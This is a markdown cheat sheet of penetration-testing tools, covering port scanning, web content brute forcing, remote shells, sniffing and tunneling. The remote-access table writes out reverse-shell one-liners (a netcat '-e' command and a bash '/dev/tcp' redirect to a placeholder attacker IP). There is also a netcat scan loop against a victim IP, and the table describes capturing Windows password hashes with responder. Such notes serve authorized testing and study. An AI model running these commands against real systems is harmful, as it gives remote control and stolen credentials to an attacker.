# Overview of Tools
## Enumeration
Tools for data gathering, analysis of infrastructure, enumeration. This includes tools like port scanning, service discovery, web content scanner.

| Tools | Description | Use | Tags |
| ----- | ----- | ----- | ----- |
| nmap | Port scanning | Scan for open ports and services, contains some scripts for automating tasks | Ports, Web, CVE |
| `for i in $(awk 'BEGIN { for ( i=1; i<=9999; i++ ) { print i; } }'); do nc -z -v <victim IP> $i; done` | Port scanning | Scan for ports in environments without nmap access | Ports, BusyBox, Shell, Alpine Linux |
| legion | NMAP GUI with some integrations | Scan for ports and open services, run NMAP scripts ans some service related tools | Ports, Web, CVE, GUI |
| dirb | Web content scanner | Crawls a webpage and finds hidden directories based on a wordlist | Wordlist, Web Content Scanner, Crawler, Directory |
| gobuster | Web content scanner, just brute force based with wordlists | Brute forces URIs and subdomains of a Web server | Wordlist, Web content scanner, Directory, DNS, Domains, URL |

## Remote access, Shells
Getting a shell and access to a target system.

| Tools | Description | Use | Tags |
| ----- | ----- | ----- | ----- |
| evil-winrm | A shell for Windows Remote Management focused on the evil side. It includes some tools for exploiting the target after gaining access. | WinRM shell access + exploiting target | WinRM, Remote Shell, Payloads, Exploiting |
| `netcat -lvp <port>` |  A netcat listener for incoming connections | Used for listening for the remote shell | Remote Shell, TCP, Listener |
| `netcat <attacker ip> <port> -e <the shell executable>` | Sends process output to a TCP connection and gets input from TCP connection | Used for opening a reverse shell (victim to target) on the target | Remote Shell, TCP |
| `bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1` | Sends process output to a TCP connection and gets input from TCP connection | Used for opening a reverse shell (victim to target) on the target if netcat is not usable for some reason (of if you don't want to download an extra file). It uses piping from bash to a tcp socket. | Bash, Reverse Shell, TCP |
| rlwrap | Readline wrapper | Make netcat use arrow keys | Netcat |
|  pwncat-cs | A netcat alternative aimed towards hackers | | Netcat, Shell, Manager |

## Sniffing
Packet and network sniffing for various protocols.

| Tools | Description | Use | Tags |
| ----- | ----- | ----- | ----- |
| tcpdump | TCP, UDP, ICMP packet sniffer | Used to sniff connections | TCP, UDP, ICMP, Sniffing |
| responder | NBT-NS, LLMNR & MDNS Responder | Used to poison windows specific services, gathering password hashes from the service request (for example from NTLM) etc. | NTLM, Responder, Windows, NetBIOS, NBT-NS, LLMNR, Link-Local Multicast Name Resolution |

## Network tunneling
Tunnel Ports.
| Tools | Description | Use | Tags |
| ----- | ----- | ----- | ----- |
| chisel | A fast TCP/UDP tunnel over HTTP | Tunnel TCP/UDP Ports in environments without SSH | Tunneling, Port Forwarding |
